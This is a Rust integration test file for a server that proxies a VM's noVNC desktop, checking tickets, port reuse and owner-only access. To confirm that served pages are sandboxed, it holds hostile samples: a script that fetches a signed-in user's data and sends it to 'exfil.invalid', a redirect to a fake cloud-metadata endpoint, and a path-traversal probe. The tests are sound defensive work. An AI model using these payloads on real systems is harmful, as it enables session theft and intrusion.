//! A Local VM's live desktop reaches a person on another machine, through this server (#191).
//!
//! A Docker box publishes noVNC on `127.0.0.1` only, and `vncUrl` used to be that loopback URL —
//! so whenever the app ran on a different machine from the server (which the client's refusal of
//! a loopback gateway makes the normal case), the Computer pane could paint only the PNG. The fix
//! serves the page and its websocket under `/coworkers/{id}/computer/vnc/{ticket}/…` and points
//! `vncUrl` there.
//!
//! The box's noVNC is a stand-in on an ephemeral loopback port that answers the page and a
//! websocket handshake, then speaks first — as RFB does — and echoes. What is asserted is what a
//! remote webview does: load the page with no Authorization header, open the websocket, and
//! trade bytes; and what a stranger with the URL of a different coworker cannot do.
//!
//! The box is also hostile here, because it can be: it answers one page with script that would
//! use the signed-in person's cookie if it ran on this origin, and another with a redirect to a
//! decoy standing in for cloud metadata. What is asserted is that every file comes back sandboxed
//! into an opaque origin, and that the decoy is never dialled.
//!
//! Needs Postgres; skips loudly without OG_DATABASE_URL. No Docker daemon.

#![allow(clippy::expect_used, clippy::panic, clippy::unwrap_used)]

use std::collections::BTreeMap;
use std::sync::atomic::{AtomicBool, AtomicU16, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use opengrok_box::{BoxResult, CommandOutput, Computer, StartedCommand};
use opengrok_core::account::{Account, AccountCommand, AccountView, Plan};
use opengrok_core::id::AccountId;
use opengrok_harness::MockDoor;
use opengrok_server::agui::AgUiState;
use opengrok_server::auth::{AuthState, TokenMinter};
use opengrok_server::connections::routes::Connectors;
use opengrok_server::host_state::HostState;
use opengrok_store::PgStore;
use serde_json::{Value, json};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

macro_rules! database_or_skip {
    () => {
        match std::env::var("OG_DATABASE_URL") {
            Ok(url) => opengrok_store::gate_database_or_panic(url),
            Err(_) => {
                eprintln!("skipping: OG_DATABASE_URL is not set");
                return;
            }
        }
    };
}

/// A Local VM whose screen is the stand-in noVNC on `port`, counting how often it is asked where
/// its screen is. A box made, rebuilt or started again comes up on `next_port` when one is set,
/// as a container comes up on new ports; a rebuild fails while `rebuild_fails`. Its PNG is its id.
struct ScreenBox {
    port: AtomicU16,
    asked: AtomicUsize,
    next_port: AtomicU16,
    rebuild_fails: AtomicBool,
}

impl ScreenBox {
    fn asked(&self) -> usize {
        self.asked.load(Ordering::SeqCst)
    }

    /// The box's screen is on `port` from its next create, rebuild or start.
    fn moves_to(&self, port: u16) {
        self.next_port.store(port, Ordering::SeqCst);
    }

    fn comes_up(&self) {
        let next = self.next_port.swap(0, Ordering::SeqCst);
        if next != 0 {
            self.port.store(next, Ordering::SeqCst);
        }
    }
}

#[async_trait]
impl Computer for ScreenBox {
    async fn create(&self, _ttl_seconds: Option<u64>) -> BoxResult<String> {
        self.comes_up();
        Ok(format!("bx_screen_{}", uuid::Uuid::now_v7().simple()))
    }
    async fn recreate(&self, _old_box_id: &str) -> BoxResult<String> {
        if self.rebuild_fails.load(Ordering::SeqCst) {
            return Err(opengrok_box::BoxError::Refused {
                status: 500,
                body: "the copy failed".to_string(),
            });
        }
        self.create(None).await
    }
    async fn screenshot(&self, box_id: &str) -> BoxResult<opengrok_box::Screenshot> {
        Ok(opengrok_box::Screenshot {
            mime: "image/png".to_string(),
            png_base64: box_id.to_string(),
            width: 1,
            height: 1,
        })
    }
    async fn run(&self, _box_id: &str, _command: &str, _timeout: u32) -> BoxResult<CommandOutput> {
        Ok(CommandOutput {
            exit_code: 0,
            stdout: String::new(),
            stderr: String::new(),
            stdout_truncated: false,
            stderr_truncated: false,
            timed_out: false,
        })
    }
    async fn start(&self, _box_id: &str, _command: &str) -> BoxResult<StartedCommand> {
        Ok(StartedCommand {
            process_id: "p".to_string(),
            running: false,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: Some(0),
        })
    }
    async fn watch(&self, box_id: &str, _process_id: &str) -> BoxResult<StartedCommand> {
        self.start(box_id, "").await
    }
    async fn read_file(&self, _box_id: &str, _path: &str) -> BoxResult<String> {
        Ok(String::new())
    }
    async fn write_file(&self, _box_id: &str, _path: &str, _content: &str) -> BoxResult<()> {
        Ok(())
    }
    async fn expose_port(&self, _box_id: &str, _port: u16, _title: &str) -> BoxResult<String> {
        Ok("http://stub.invalid".to_string())
    }
    async fn stop(&self, _box_id: &str) -> BoxResult<()> {
        Ok(())
    }
    async fn resume(&self, _box_id: &str) -> BoxResult<()> {
        self.comes_up();
        Ok(())
    }
    async fn destroy(&self, _box_id: &str) -> BoxResult<()> {
        Ok(())
    }
    async fn state(&self, _box_id: &str) -> BoxResult<String> {
        Ok("running".to_string())
    }
    async fn screen_url(&self, _box_id: &str) -> BoxResult<Option<String>> {
        self.asked.fetch_add(1, Ordering::SeqCst);
        Ok(Some(format!(
            "http://127.0.0.1:{}/vnc.html?autoconnect=true&resize=scale&reconnect=true&password=pw4boxA1",
            self.port.load(Ordering::SeqCst)
        )))
    }
}

/// Everything up to the blank line, and what came after it in the same reads.
async fn read_head(stream: &mut tokio::net::TcpStream) -> (String, Vec<u8>) {
    let mut seen = Vec::new();
    let mut chunk = [0u8; 1024];
    loop {
        let read = stream.read(&mut chunk).await.expect("read");
        assert!(read > 0, "the peer hung up mid-head: {seen:?}");
        seen.extend_from_slice(&chunk[..read]);
        if let Some(end) = seen.windows(4).position(|w| w == b"\r\n\r\n") {
            let rest = seen.split_off(end + 4);
            return (String::from_utf8_lossy(&seen).into_owned(), rest);
        }
    }
}

/// noVNC's page, as far as the proxy can tell.
const NOVNC_PAGE: &str =
    "<!DOCTYPE html><html><head><title>noVNC</title></head>novnc-stand-in</html>";

/// What a box that was taken over serves as a page: script that acts as whoever opens it.
const HOSTILE: &str = "<script>fetch('/coworkers',{credentials:'include'})\
.then(r=>r.text()).then(t=>new WebSocket('ws://exfil.invalid/'+btoa(t)))</script>";

/// A listener standing in for cloud metadata or an internal service a redirect could point at.
/// It counts every connection it is ever offered.
async fn start_decoy() -> (u16, Arc<AtomicUsize>) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind");
    let port = listener.local_addr().expect("addr").port();
    let hits = Arc::new(AtomicUsize::new(0));
    let counted = hits.clone();
    tokio::spawn(async move {
        while let Ok((mut stream, _)) = listener.accept().await {
            counted.fetch_add(1, Ordering::SeqCst);
            let _ = stream
                .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 12\r\n\r\nAKIA-SECRET!")
                .await;
        }
    });
    (port, hits)
}

/// noVNC as websockify serves it: the page over HTTP, and a websocket on `/websockify` that
/// speaks first and then echoes. Plus what a hostile box adds: a page of script, and a redirect
/// to `decoy`. Every request line it is sent is kept in `saw`. Aborting the task closes the port.
async fn start_novnc(
    decoy: u16,
    saw: Arc<Mutex<Vec<String>>>,
) -> (u16, tokio::task::JoinHandle<()>) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind");
    let port = listener.local_addr().expect("addr").port();
    let listening = tokio::spawn(async move {
        loop {
            let Ok((mut stream, _)) = listener.accept().await else {
                return;
            };
            let saw = saw.clone();
            tokio::spawn(async move {
                let (head, _) = read_head(&mut stream).await;
                saw.lock()
                    .expect("saw")
                    .push(head.lines().next().unwrap_or_default().to_string());
                if head.to_ascii_lowercase().contains("upgrade: websocket") {
                    assert!(head.starts_with("GET /websockify "), "{head}");
                    let key = head
                        .lines()
                        .find_map(|line| line.strip_prefix("Sec-WebSocket-Key: "))
                        .expect("the browser's key is replayed")
                        .to_string();
                    let reply = format!(
                        "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n\
                         Connection: Upgrade\r\nSec-WebSocket-Accept: accept-for-{key}\r\n\r\nRFB 003.008\n"
                    );
                    stream.write_all(reply.as_bytes()).await.expect("101");
                    let mut chunk = [0u8; 256];
                    loop {
                        let read = stream.read(&mut chunk).await.unwrap_or(0);
                        if read == 0 {
                            return;
                        }
                        let _ = stream.write_all(&chunk[..read]).await;
                    }
                }
                if head.starts_with("GET /moved.html ") {
                    let reply = format!(
                        "HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:{decoy}/latest/meta-data/\r\n\
                         Content-Length: 0\r\nConnection: close\r\n\r\n"
                    );
                    let _ = stream.write_all(reply.as_bytes()).await;
                    return;
                }
                let (body, kind) = if head.starts_with("GET /vnc.html ") {
                    (NOVNC_PAGE, "text/html")
                } else if head.starts_with("GET /app/ui.js ") {
                    ("ui-script", "text/javascript")
                } else if head.starts_with("GET /hostile.html ") {
                    (HOSTILE, "text/html")
                } else {
                    ("", "text/html")
                };
                let status = if body.is_empty() {
                    "404 Not Found"
                } else {
                    "200 OK"
                };
                let reply = format!(
                    "HTTP/1.1 {status}\r\nContent-Type: {kind}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = stream.write_all(reply.as_bytes()).await;
            });
        }
    });
    (port, listening)
}

async fn seed_account(store: &PgStore, email: &str) -> AccountId {
    let id = AccountId::new();
    let at_ms = chrono::Utc::now().timestamp_millis();
    let events = Account::default()
        .decide(AccountCommand::Register {
            email: email.to_string(),
            password_hash: "x".to_string(),
            first_name: "Screen".to_string(),
            last_name: String::new(),
            org_id: String::new(),
            plan: Plan::Ultra,
            verified: true,
            enabled: true,
            at_ms,
        })
        .expect("register");
    let view = AccountView {
        id: id.clone(),
        email: email.to_string(),
        plan: Plan::Ultra,
        trial: false,
        updated_at_ms: at_ms,
        password_hash: Some("x".to_string()),
        first_name: "Screen".to_string(),
        last_name: String::new(),
        org_id: None,
        verified: true,
        enabled: true,
        avatar_url: None,
    };
    store
        .append_account(&id, 0, &events, &view)
        .await
        .expect("append account");
    id
}

/// A group of `account`'s with `member` in it, written as a hire of one writes it.
async fn seed_group(store: &PgStore, account: &AccountId, member: &str) -> String {
    use opengrok_core::coworker::{Coworker, CoworkerCommand, CoworkerView};
    let id = opengrok_core::id::CoworkerId::new();
    let at_ms = chrono::Utc::now().timestamp_millis();
    let events = Coworker::default()
        .decide(CoworkerCommand::HireGroup {
            name: "The desk".to_string(),
            members: vec![opengrok_core::id::CoworkerId::from_stored(
                member.to_string(),
            )],
            at_ms,
        })
        .expect("hire a group");
    let group = Coworker::replay(&events);
    let view = CoworkerView::of(id.clone(), &group, at_ms);
    store
        .append_coworker(&id, account, 0, &events, &view)
        .await
        .expect("append the group");
    id.as_str().to_string()
}

struct Harness {
    base: String,
    port: u16,
    state: AgUiState,
    client: reqwest::Client,
    decoy: u16,
    decoy_hits: Arc<AtomicUsize>,
    box_saw: Arc<Mutex<Vec<String>>>,
    screen: Arc<ScreenBox>,
    novnc: tokio::task::JoinHandle<()>,
    pool: sqlx::PgPool,
}

async fn harness(database_url: &str) -> Harness {
    let pool = sqlx::postgres::PgPoolOptions::new()
        .max_connections(4)
        .connect(database_url)
        .await
        .expect("connect to Postgres");
    opengrok_store::migrations::run(&pool)
        .await
        .expect("migrations");
    let (decoy, decoy_hits) = start_decoy().await;
    let box_saw = Arc::new(Mutex::new(Vec::new()));
    let (novnc_port, novnc) = start_novnc(decoy, box_saw.clone()).await;
    let screen = Arc::new(ScreenBox {
        port: AtomicU16::new(novnc_port),
        asked: AtomicUsize::new(0),
        next_port: AtomicU16::new(0),
        rebuild_fails: AtomicBool::new(false),
    });
    let state = AgUiState {
        // OG_PUBLIC_GATEWAY_URL as it was when the screen went blank (3 Oct 2026): an https front
        // nobody runs. The test talks to plain loopback, as that app did, so it must be sent back
        // there to load anything.
        auth: AuthState::new(
            PgStore::new(pool.clone()),
            Arc::new(TokenMinter::new(b"proxied-screen-test-secret")),
            "host@og.local".to_string(),
        )
        .with_resend(None, "https://uriahs-MacBook-Pro.local:1447".to_string()),
        door: Arc::new(MockDoor::echoing()),
        model: "oag/cheap".to_string(),
        auto_review_model: "oag/cheap".to_string(),
        computer: Some(screen.clone()),
        vault: None,
        connectors: Connectors {
            providers: Arc::new(BTreeMap::new()),
            redirect_uri: "http://127.0.0.1/callback".to_string(),
        },
        plugins: Arc::new(BTreeMap::new()),
        host_settings: None,
    };
    let gateway = HostState::new(state.clone(), None);
    let app = opengrok_server::router(state.clone(), gateway);
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind");
    let port = listener.local_addr().expect("addr").port();
    tokio::spawn(async move {
        axum::serve(listener, app).await.expect("serve");
    });
    Harness {
        base: format!("http://127.0.0.1:{port}"),
        port,
        state,
        client: reqwest::Client::new(),
        decoy,
        decoy_hits,
        box_saw,
        screen,
        novnc,
        pool,
    }
}

impl Harness {
    async fn person(&self) -> String {
        self.person_and_account().await.0
    }

    /// Another stand-in noVNC, on a port of its own, keeping its own log of what it was asked:
    /// where a box's screen comes up when it moves, while the old listener stays up as whatever
    /// took the freed port.
    async fn another_screen(&self) -> (u16, Arc<Mutex<Vec<String>>>) {
        let saw = Arc::new(Mutex::new(Vec::new()));
        let (port, _listening) = start_novnc(self.decoy, saw.clone()).await;
        (port, saw)
    }

    /// `GET /coworkers/{id}/screen`: its status, and its body as text (the stand-in PNG is the
    /// box's id).
    async fn png(&self, token: &str, coworker: &str) -> (u16, String) {
        let response = self
            .client
            .get(format!("{}/coworkers/{coworker}/screen", self.base))
            .bearer_auth(token)
            .send()
            .await
            .expect("screen png");
        let status = response.status().as_u16();
        (status, response.text().await.expect("body"))
    }

    /// The coworker's status once an update has ended, done or failed.
    async fn settled_update(&self, token: &str, coworker: &str) -> Value {
        for _ in 0..200 {
            let (status, screen) = self.screen(token, coworker).await;
            assert_eq!(status, 200, "{screen}");
            if screen["update"].is_null() || screen["update"]["phase"] == "failed" {
                return screen;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        panic!("the update did not end");
    }

    async fn person_and_account(&self) -> (String, AccountId) {
        let email = format!("screen-{}@og.local", uuid::Uuid::now_v7().simple());
        let account = seed_account(&self.state.auth.store, &email).await;
        let token = self
            .state
            .auth
            .minter
            .mint_access(
                account.as_str(),
                "sess-screen",
                &email,
                "ultra",
                chrono::Utc::now().timestamp(),
                3600,
            )
            .expect("mint access");
        (token, account)
    }

    async fn hire(&self, token: &str) -> String {
        let response = self
            .client
            .post(format!("{}/coworkers", self.base))
            .bearer_auth(token)
            .json(&json!({ "name": "Screen" }))
            .send()
            .await
            .expect("hire");
        assert_eq!(response.status().as_u16(), 201, "hire");
        let body: Value = response.json().await.expect("hire body");
        body["id"].as_str().expect("id").to_string()
    }

    async fn screen(&self, token: &str, coworker: &str) -> (u16, Value) {
        let response = self
            .client
            .get(format!("{}/coworkers/{coworker}/computer", self.base))
            .bearer_auth(token)
            .send()
            .await
            .expect("screen");
        let status = response.status().as_u16();
        let text = response.text().await.expect("text");
        (
            status,
            serde_json::from_str(&text).unwrap_or(Value::String(text)),
        )
    }

    /// A GET with no Authorization header — what a webview loading `vncUrl` sends.
    async fn open(&self, url: &str) -> (u16, String) {
        let response = self.client.get(url).send().await.expect("open");
        (
            response.status().as_u16(),
            response.text().await.expect("text"),
        )
    }

    /// A GET whose path is sent byte for byte. reqwest normalises `..` away before a request
    /// leaves, so a probe through it never reaches the server's own check.
    async fn raw_get(&self, path: &str) -> String {
        let mut socket = tokio::net::TcpStream::connect(("127.0.0.1", self.port))
            .await
            .expect("dial");
        let hello = format!(
            "GET {path} HTTP/1.1\r\nHost: 127.0.0.1:{}\r\nConnection: close\r\n\r\n",
            self.port
        );
        socket.write_all(hello.as_bytes()).await.expect("hello");
        let mut reply = Vec::new();
        socket.read_to_end(&mut reply).await.expect("reply");
        String::from_utf8_lossy(&reply).into_owned()
    }

    /// The path under the ticket for `coworker`'s screen, as the owner's `vncUrl` names it.
    async fn ticket_path(&self, token: &str, coworker: &str) -> String {
        let (status, screen) = self.screen(token, coworker).await;
        assert_eq!(status, 200, "{screen}");
        let vnc = screen["vncUrl"].as_str().expect("a live screen");
        let (page, _) = vnc.split_once('?').expect("settings");
        page.strip_suffix("/vnc.html")
            .expect("the page")
            .to_string()
    }

    /// The first line of the answer to noVNC's websocket handshake under `ticket_path`.
    async fn websocket(&self, ticket_path: &str) -> String {
        let mut socket = tokio::net::TcpStream::connect(("127.0.0.1", self.port))
            .await
            .expect("dial");
        let path = ticket_path.trim_start_matches(&self.base);
        let hello = format!(
            "GET {path}/websockify HTTP/1.1\r\nHost: 127.0.0.1:{}\r\nUpgrade: websocket\r\n\
             Connection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: a2V5\r\n\r\n",
            self.port
        );
        socket.write_all(hello.as_bytes()).await.expect("hello");
        let (head, _) = read_head(&mut socket).await;
        head.lines().next().unwrap_or_default().to_string()
    }
}

/// A page's ~80 files and its websocket each asked the provider where the box's screen was —
/// two `docker` processes apiece, 160 at once, 3.7 s a file and 5 s before the window painted
/// (3 Oct 2026). The page's first file finds the port; every file and the socket after it use
/// that port, and the account's right to the coworker is still asked each time.
#[tokio::test]
async fn a_page_and_its_files_ask_where_the_screen_is_once() {
    let database_url = database_or_skip!();
    let h = harness(&database_url).await;
    let ada = h.person().await;
    let coworker = h.hire(&ada).await;
    let ticket_path = h.ticket_path(&ada, &coworker).await;
    let asked = h.screen.asked();
    for file in ["vnc.html", "app/ui.js", "app/ui.js", "vnc.html"] {
        let (status, body) = h.open(&format!("{ticket_path}/{file}")).await;
        assert_eq!(status, 200, "{file}: {body}");
    }
    let opened = h.websocket(&ticket_path).await;
    assert!(opened.starts_with("HTTP/1.1 101"), "{opened}");
    assert_eq!(
        h.screen.asked(),
        asked + 1,
        "the ticket's port is found once"
    );

    // The right to the coworker is not remembered with the port: once it is retired, the very
    // next file and handshake are refused.
    let retired = h
        .client
        .delete(format!("{}/coworkers/{coworker}", h.base))
        .bearer_auth(&ada)
        .send()
        .await
        .expect("retire");
    assert!(retired.status().is_success(), "{}", retired.status());
    assert_eq!(h.open(&format!("{ticket_path}/app/ui.js")).await.0, 404);
    assert!(h.websocket(&ticket_path).await.starts_with("HTTP/1.1 404"));
}

/// Docker gives a box new ports each time it starts, so a remembered one can go dead under a
/// ticket that is still good. Nothing answering on it is the sign: the port is asked for again
/// and the same request is served, file or websocket.
#[tokio::test]
async fn a_screen_that_came_back_on_another_port_is_found_again() {
    let database_url = database_or_skip!();
    let mut h = harness(&database_url).await;
    let ada = h.person().await;
    let coworker = h.hire(&ada).await;
    let ticket_path = h.ticket_path(&ada, &coworker).await;
    assert_eq!(h.open(&format!("{ticket_path}/app/ui.js")).await.0, 200);

    let gone = h.screen.port.load(Ordering::SeqCst);
    h.novnc.abort();
    let _ = (&mut h.novnc).await;
    let moved = loop {
        let (port, _restarted) = start_novnc(h.decoy, h.box_saw.clone()).await;
        if port != gone {
            break port;
        }
    };
    h.screen.port.store(moved, Ordering::SeqCst);
    let asked = h.screen.asked();
    assert_eq!(
        h.open(&format!("{ticket_path}/app/ui.js")).await,
        (200, "ui-script".to_string())
    );
    assert_eq!(
        h.screen.asked(),
        asked + 1,
        "the dead port is asked for once"
    );
    let opened = h.websocket(&ticket_path).await;
    assert!(opened.starts_with("HTTP/1.1 101"), "{opened}");
}

/// A reset destroys the box, and Docker may hand its freed loopback port to anything. The old
/// ticket's remembered port goes with the box on the reset itself, never dialled while a place
/// check is due: the old listener stays up here as whatever took the port, and is never asked.
#[tokio::test]
async fn a_reset_drops_the_old_boxs_port_at_once() {
    let database_url = database_or_skip!();
    let h = harness(&database_url).await;
    let ada = h.person().await;
    let coworker = h.hire(&ada).await;
    let old = h.ticket_path(&ada, &coworker).await;
    assert_eq!(h.open(&format!("{old}/app/ui.js")).await.0, 200);

    let (moved, fresh_saw) = h.another_screen().await;
    h.screen.moves_to(moved);
    let reset = h
        .client
        .post(format!("{}/coworkers/{coworker}/computer/reset", h.base))
        .bearer_auth(&ada)
        .send()
        .await
        .expect("reset");
    assert_eq!(reset.status().as_u16(), 200, "reset");
    let taken = h.box_saw.lock().expect("saw").len();
    assert_eq!(h.open(&format!("{old}/app/ui.js")).await.0, 404);
    assert!(h.websocket(&old).await.starts_with("HTTP/1.1 404"));
    assert_eq!(
        h.box_saw.lock().expect("saw").len(),
        taken,
        "the reset box's freed port was dialled"
    );

    let fresh = h.ticket_path(&ada, &coworker).await;
    assert_ne!(fresh, old, "the new box is a new ticket");
    assert_eq!(h.open(&format!("{fresh}/app/ui.js")).await.0, 200);
    let fresh_saw = fresh_saw.lock().expect("saw").len();
    assert_eq!(fresh_saw, 1, "on the new box's port");
}

/// An update stops the old box for the copy and removes it once the new one runs: the old
/// ticket's port is dropped with it, rather than dialled until a place check notices.
#[tokio::test]
async fn an_update_drops_the_old_boxs_port_at_once() {
    let database_url = database_or_skip!();
    let h = harness(&database_url).await;
    let ada = h.person().await;
    let coworker = h.hire(&ada).await;
    let old = h.ticket_path(&ada, &coworker).await;
    assert_eq!(h.open(&format!("{old}/app/ui.js")).await.0, 200);

    let (moved, fresh_saw) = h.another_screen().await;
    h.screen.moves_to(moved);
    let update = h
        .client
        .post(format!("{}/coworkers/{coworker}/computer/update", h.base))
        .bearer_auth(&ada)
        .send()
        .await
        .expect("update");
    assert_eq!(update.status().as_u16(), 202, "update");
    let settled = h.settled_update(&ada, &coworker).await;
    assert!(
        settled["update"].is_null(),
        "the update finished: {settled}"
    );
    let taken = h.box_saw.lock().expect("saw").len();
    assert_eq!(h.open(&format!("{old}/app/ui.js")).await.0, 404);
    assert_eq!(
        h.box_saw.lock().expect("saw").len(),
        taken,
        "the updated box's freed port was dialled"
    );

    let fresh = h.ticket_path(&ada, &coworker).await;
    assert_eq!(h.open(&format!("{fresh}/app/ui.js")).await.0, 200);
    let fresh_saw = fresh_saw.lock().expect("saw").len();
    assert_eq!(fresh_saw, 1, "on the new box's port");
}

/// A rebuild that fails starts the old box again, on new ports, and it stays the coworker's
/// computer under the same ticket. That ticket's next file is fetched from where the box is
/// now, never from the port it had before the update.
#[tokio::test]
async fn a_failed_rebuild_drops_the_port_its_box_came_back_without() {
    let database_url = database_or_skip!();
    let h = harness(&database_url).await;
    let ada = h.person().await;
    let coworker = h.hire(&ada).await;
    let ticket = h.ticket_path(&ada, &coworker).await;
    assert_eq!(h.open(&format!("{ticket}/app/ui.js")).await.0, 200);

    let (moved, fresh_saw) = h.another_screen().await;
    h.screen.moves_to(moved);
    h.screen.rebuild_fails.store(true, Ordering::SeqCst);
    let update = h
        .client
        .post(format!("{}/coworkers/{coworker}/computer/update", h.base))
        .bearer_auth(&ada)
        .send()
        .await
        .expect("update");
    assert_eq!(update.status().as_u16(), 202, "update");
    let settled = h.settled_update(&ada, &coworker).await;
    assert_eq!(settled["update"]["phase"], "failed", "{settled}");
    let taken = h.box_saw.lock().expect("saw").len();
    assert_eq!(
        h.open(&format!("{ticket}/app/ui.js")).await,
        (200, "ui-script".to_string())
    );
    assert_eq!(
        h.box_saw.lock().expect("saw").len(),
        taken,
        "the port the box had before the failed rebuild was dialled"
    );
    let fresh_saw = fresh_saw.lock().expect("saw").len();
    assert_eq!(fresh_saw, 1, "on the port it came back on");
}

/// The place check every few seconds asks for the box's port as well as its place: a box that
/// came back on another port behind this server's back (a restart by hand) is found there, and
/// the port it left is not handed back because the box is still the coworker's.
#[tokio::test]
async fn a_place_check_asks_for_the_port_again() {
    let database_url = database_or_skip!();
    let h = harness(&database_url).await;
    let ada = h.person().await;
    let coworker = h.hire(&ada).await;
    let ticket = h.ticket_path(&ada, &coworker).await;
    assert_eq!(h.open(&format!("{ticket}/app/ui.js")).await.0, 200);

    let (moved, fresh_saw) = h.another_screen().await;
    h.screen.port.store(moved, Ordering::SeqCst);
    opengrok_server::agui::screen_proxy::screen_tickets_due();
    let taken = h.box_saw.lock().expect("saw").len();
    assert_eq!(h.open(&format!("{ticket}/app/ui.js")).await.0, 200);
    assert_eq!(h.box_saw.lock().expect("saw").len(), taken, "the old port");
    let fresh_saw = fresh_saw.lock().expect("saw").len();
    assert_eq!(fresh_saw, 1, "the port the box is on");
}

/// A group's computer is its own, and its owner's is another: when the group's event stream
/// cannot be read, /screen says it has no computer, as the pane does, instead of reading the
/// group as a plain coworker and showing its owner's own box.
#[tokio::test]
async fn a_coworker_that_cannot_be_read_shows_no_screen() {
    let database_url = database_or_skip!();
    let h = harness(&database_url).await;
    let (ada, account) = h.person_and_account().await;
    let member = h.hire(&ada).await;
    let group = seed_group(&h.state.auth.store, &account, &member).await;
    let given = h
        .client
        .post(format!("{}/coworkers/{group}/computer", h.base))
        .bearer_auth(&ada)
        .send()
        .await
        .expect("give the group a computer");
    assert_eq!(given.status().as_u16(), 200);
    let (_, own) = h.screen(&ada, &member).await;
    let own = own["boxId"].as_str().expect("the owner's box").to_string();
    let (status, desk) = h.png(&ada, &group).await;
    assert_eq!(status, 200, "{desk}");
    assert!(!desk.contains(&own), "the group's desk is its own: {desk}");

    let id = opengrok_core::id::CoworkerId::from_stored(group.clone());
    sqlx::query("update events set payload = '{\"type\": \"NotAnEvent\"}' where stream_id = $1")
        .bind(opengrok_store::coworker_stream(&id))
        .execute(&h.pool)
        .await
        .expect("spoil the group's stream");
    let (status, body) = h.png(&ada, &group).await;
    assert_eq!(status, 404, "another computer's PNG: {body}");
    assert!(!body.contains(&own), "{body}");
    let (status, pane) = h.screen(&ada, &group).await;
    assert_eq!(status, 200, "{pane}");
    assert_eq!(pane["state"], "absent", "as the pane says: {pane}");
}

#[tokio::test]
async fn the_screen_is_served_through_the_server_to_its_owner_only() {
    let database_url = database_or_skip!();
    let h = harness(&database_url).await;
    let ada = h.person().await;
    let coworker = h.hire(&ada).await;

    let (status, screen) = h.screen(&ada, &coworker).await;
    assert_eq!(status, 200, "{screen}");
    let vnc = screen["vncUrl"]
        .as_str()
        .expect("a live screen")
        .to_string();
    let prefix = format!("{}/coworkers/{coworker}/computer/vnc/", h.base);
    assert!(
        vnc.starts_with(&prefix),
        "vncUrl must name this server, where the app can reach it: {vnc}"
    );
    let novnc = h
        .state
        .computer
        .as_ref()
        .expect("provider")
        .screen_url("any")
        .await
        .expect("page")
        .expect("page");
    let loopback = novnc.split('/').nth(2).expect("authority");
    assert!(
        !vnc.contains(loopback),
        "the box's own port must not leak: {vnc}"
    );
    assert!(
        vnc.contains("password=pw4boxA1"),
        "noVNC still signs itself in: {vnc}"
    );
    let (page, settings) = vnc.split_once('?').expect("settings");
    let ticket_path = page.strip_suffix("/vnc.html").expect("the page");
    let ws_path = format!(
        "path={}/websockify",
        ticket_path.trim_start_matches(&format!("{}/", h.base))
    );
    assert!(
        settings.contains(&ws_path),
        "noVNC must dial its socket here: {vnc}"
    );

    // The page and its relative assets, with no header — the way a webview loads them. The page
    // gains one script, first in its head, standing in for the storage the sandbox takes away
    // (noVNC before 1.5 died without it); a script file is passed on byte for byte.
    let (status, page) = h.open(&vnc).await;
    assert_eq!(status, 200, "{page}");
    let shimmed = page
        .strip_prefix("<!DOCTYPE html><html><head><script>")
        .unwrap_or_else(|| panic!("the stand-in storage first in the head: {page}"));
    assert!(shimmed.contains("localStorage"), "{page}");
    assert!(
        page.ends_with("</script><title>noVNC</title></head>novnc-stand-in</html>"),
        "the rest of the page is untouched: {page}"
    );
    assert_eq!(
        h.open(&format!("{ticket_path}/app/ui.js")).await,
        (200, "ui-script".to_string())
    );

    // The websocket: the handshake is replayed to the box, RFB's first words arrive, and bytes
    // pass both ways.
    let mut socket = tokio::net::TcpStream::connect(("127.0.0.1", h.port))
        .await
        .expect("dial");
    let path = ticket_path.trim_start_matches(&h.base);
    let hello = format!(
        "GET {path}/websockify HTTP/1.1\r\nHost: 127.0.0.1:{}\r\nUpgrade: websocket\r\n\
         Connection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: a2V5LWZyb20tYnJvd3Nlcg==\r\n\r\n",
        h.port
    );
    socket.write_all(hello.as_bytes()).await.expect("hello");
    let (head, mut early) = read_head(&mut socket).await;
    assert!(head.starts_with("HTTP/1.1 101"), "{head}");
    assert!(
        head.to_ascii_lowercase()
            .contains("sec-websocket-accept: accept-for-a2v5lwzyb20tynjvd3nlcg=="),
        "the box's accept for the browser's key must pass through: {head}"
    );
    let mut chunk = [0u8; 256];
    while !String::from_utf8_lossy(&early).contains("RFB 003.008") {
        let read = socket.read(&mut chunk).await.expect("read");
        assert!(read > 0, "the socket closed before RFB spoke");
        early.extend_from_slice(&chunk[..read]);
    }
    socket.write_all(b"pointer-event").await.expect("send");
    let mut echoed = Vec::new();
    while !String::from_utf8_lossy(&echoed).contains("pointer-event") {
        let read = socket.read(&mut chunk).await.expect("read");
        assert!(read > 0, "the socket closed before the echo");
        echoed.extend_from_slice(&chunk[..read]);
    }

    // A forged or altered ticket, and a real ticket on another coworker's path, are both 404.
    let mut forged = ticket_path.to_string();
    forged.push('x');
    assert_eq!(h.open(&format!("{forged}/vnc.html")).await.0, 404);
    let bob = h.person().await;
    let bobs = h.hire(&bob).await;
    let (status, _) = h.screen(&bob, &coworker).await;
    assert_eq!(status, 404, "a stranger cannot ask for the screen");
    let crossed = ticket_path.replace(&coworker, &bobs);
    assert_eq!(h.open(&format!("{crossed}/vnc.html")).await.0, 404);
    // Climbing out of noVNC's own files is refused before the box is asked.
    let path = ticket_path.trim_start_matches(&h.base);
    let climbed = h.raw_get(&format!("{path}/app/../../etc")).await;
    assert!(climbed.starts_with("HTTP/1.1 404"), "{climbed}");
    assert!(climbed.ends_with("no such file"), "{climbed}");
    let saw = h.box_saw.lock().expect("saw").clone();
    assert!(
        saw.iter().all(|line| !line.contains("..")),
        "the box must never be asked for a climbing path: {saw:?}"
    );
}

#[tokio::test]
async fn the_boxs_pages_are_sandboxed_and_its_redirects_never_followed() {
    let database_url = database_or_skip!();
    let h = harness(&database_url).await;
    let ada = h.person().await;
    let coworker = h.hire(&ada).await;
    let ticket_path = h.ticket_path(&ada, &coworker).await;

